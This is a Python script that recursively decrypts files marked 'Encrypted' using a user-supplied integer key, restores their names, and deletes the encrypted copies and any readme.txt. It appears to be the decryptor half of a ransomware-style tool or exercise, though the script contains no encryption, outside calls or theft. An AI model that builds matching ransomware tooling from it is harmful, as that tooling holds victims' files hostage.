import random
import RandomTextGenerator
import os
from random import randrange
import time
from cryptography.fernet import Fernet
 

def decryptFile(fileName, AES):      #decrypts fileName using privateKey and partialKey
        encryptedFile = open(fileName, "rb")
        toDecrypt = encryptedFile.read()
        encryptedFile.close()

        decryptedFile = open("Decrypted" + fileName, "wb+")
        decryptedData = AES.decrypt(toDecrypt)
        decryptedFile.write(decryptedData)
        decryptedFile.close()
        
def decryptFolder(folderName, privateKey):      #decrypts folderName using privateKey and partialKey
        os.chdir(folderName)
        contents = os.listdir()
        intoAES = int.to_bytes(privateKey, 44, byteorder='big')
        AES = Fernet(intoAES)
        for x in contents:
                if "Encrypted" in x:
                        if os.path.isfile(x):
                                print(x.replace('Encrypted', ''))
                                decryptFile(x, AES)
                                os.remove(x)
                                os.rename("Decrypted"+x, str.replace(x, "Encrypted", "", 1))
                elif "readme.txt" == x:
                        os.remove(x)
                elif os.path.isdir(x):
                                decryptFolder(folderName + "\\" + x, privateKey)
                                os.chdir(folderName)

print('Private key please:')
privateKeyInput = input()
print("privateKeyInput = " + privateKeyInput + '\n')


decryptFolder(os.getcwd(), int(privateKeyInput))
print('decrypted')
time.sleep(3)
